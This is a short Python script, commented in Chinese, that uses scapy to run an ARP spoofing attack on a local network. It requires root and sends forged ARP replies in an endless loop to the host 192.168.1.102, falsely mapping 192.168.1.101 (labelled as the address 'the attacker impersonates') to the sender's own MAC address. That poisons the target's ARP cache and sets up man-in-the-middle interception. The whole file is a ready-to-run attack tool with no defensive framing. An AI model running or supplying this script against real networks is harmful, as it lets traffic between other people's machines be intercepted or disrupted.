# -*- coding:utf-8 -*-

#usage: sudo python ARP.py

import sys, os
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *

if os.geteuid() != 0:
	print "This program must be run as root. Aborting."
	sys.exit()

def getLocMAC(iface):
	return get_if_hwaddr(iface)


def getLocIP(iface):
	return get_if_addr(iface)


def sendARPRes(psrc, hwsrc, pdst, freq = 0.5):
	"""发送ARP应答包，告知IP为pdst的主机：IP为psrc的主机的mac地址为hwsrc。
	"""
	pkt = ARP()
	pkt.psrc = psrc		
	pkt.hwsrc = hwsrc	
	pkt.pdst = pdst
	pkt.op = 2		#ARP请求则设1('who-has')；ARP应答则设2('is_at')
	send(pkt, loop = 1, inter=freq)		#以freq为秒间隔，循环发送


iface = 'eno16777736'
#iface = 'en0'				#网卡

psrc = getLocIP(iface)		#获取本机IP地址（实际上未用到）
hwsrc = getLocMAC(iface)	#获取本机mac地址

pdst = '192.168.1.102'		#将该ARP包发给IP为pdst的主机
gpsrc = '192.168.1.101'		#攻击者伪装成的ip

sendARPRes(gpsrc, hwsrc, pdst);


























